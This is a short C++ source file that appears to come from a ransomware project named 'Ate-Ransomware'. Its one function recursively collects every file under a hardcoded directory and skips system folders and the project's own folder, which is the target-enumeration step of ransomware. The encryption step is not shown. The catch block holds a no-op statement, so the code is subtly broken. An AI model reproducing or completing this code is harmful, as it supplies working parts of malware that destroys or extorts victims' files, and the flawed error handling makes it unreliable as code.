#include "search.h"
#include <vector>
#include <string>
#include <iostream>
#include <filesystem>

namespace fs = std::filesystem;

void Search::getCDriveFolders(std::vector<std::string>& drive) {

    for (const auto& dirEntry : fs::recursive_directory_iterator("C:\\Users\\Gustavo Santos\\Desktop\\sf", fs::directory_options::skip_permission_denied)) {
        try {
            if (!dirEntry.is_directory() && !(strstr(dirEntry.path().string().c_str(), "Windows") || strstr(dirEntry.path().string().c_str(), "Ate-Ransomware") || strstr(dirEntry.path().string().c_str(), "Program Files") || strstr(dirEntry.path().string().c_str(), "Program Files (x86)") || strstr(dirEntry.path().string().c_str(), "$Recycle.Bin") || strstr(dirEntry.path().string().c_str(), "ProgramData") || strstr(dirEntry.path().string().c_str(), "AppData")))
                drive.push_back(dirEntry.path().generic_string());
        }
        catch (std::system_error) {&fs::recursive_directory_iterator::increment;}
    }
}
